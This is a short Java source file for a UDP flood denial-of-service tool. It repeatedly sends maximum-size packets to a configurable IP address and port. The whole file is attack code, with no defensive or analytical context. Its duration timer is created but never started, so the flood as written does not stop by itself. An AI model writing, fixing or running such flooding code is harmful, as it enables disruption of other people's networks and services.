package com.turbokot.udpflood;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPFLOOD {
    public static String ip;
    public static int port;
    public static int duration;
    public static boolean attackRunning = false;

    public static void run() throws Throwable {
        if (!attackRunning) {
            attackRunning = true;
        }
        new Thread(() -> {
            for (int i = 0; i < duration; ++i) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException var2) {
                }
            }
            attackRunning = false;
        });
        DatagramSocket socket = null;
        InetAddress address = null;
        byte[] buf = new byte[65507];
        socket = new DatagramSocket();
        address = InetAddress.getByName(ip);
        DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);
        while (attackRunning) {
            socket.send(packet);
            System.out.println("Packet sent!");
        }
        socket.close();
    }
}
